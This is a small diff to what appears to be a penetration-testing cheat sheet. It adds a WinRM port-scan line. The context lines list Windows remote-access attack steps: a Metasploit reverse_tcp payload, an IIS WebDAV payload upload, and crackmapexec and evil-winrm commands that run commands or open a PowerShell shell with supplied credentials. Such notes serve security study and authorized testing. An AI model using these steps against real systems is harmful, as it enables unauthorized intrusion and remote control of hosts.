@@ -15,6 +15,7 @@ set payload windows/metrepreter/reverse_tcp
 iis upload // make sure to set Path /webdavdir/payload
 
 WINRM -
+scan 5985-6
 crackmapexec winrm ip -u user -p pass // -x "command"
 evil-winrm.rb -u user -p pass -i ip // gets powershell shell 
 wimrm_script // MSF  set FORCE_VBS true
